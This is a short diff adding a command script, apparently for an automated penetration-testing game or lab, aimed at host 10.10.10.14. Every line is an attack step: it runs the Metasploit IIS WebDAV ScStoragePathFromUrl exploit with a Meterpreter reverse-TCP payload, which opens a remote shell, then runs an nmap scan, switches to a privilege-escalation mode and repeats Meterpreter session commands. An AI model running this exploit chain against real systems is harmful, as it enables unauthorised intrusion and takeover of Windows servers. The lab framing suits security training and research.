@@ -1,0 +1,14 @@
+# target 10.10.10.14
+
+exploit/windows/iis/iis_webdav_scstoragepathfromurl; guess_options; set payload windows/meterpreter/reverse_tcp; run;
+
+db_nmap; guess_options; run;
+
+exploit/windows/iis/iis_webdav_scstoragepathfromurl; guess_options; set payload windows/meterpreter/reverse_tcp; run;
+
+set_game_type PRIVESC;
+
+execute_meterpretershell_command_in_session; options; guess_options; run;
+execute_meterpretershell_command_in_session; options; guess_options; run;
+execute_meterpretershell_command_in_session; options; guess_options; run;
+execute_meterpretershell_command_in_session; options; guess_options; run;
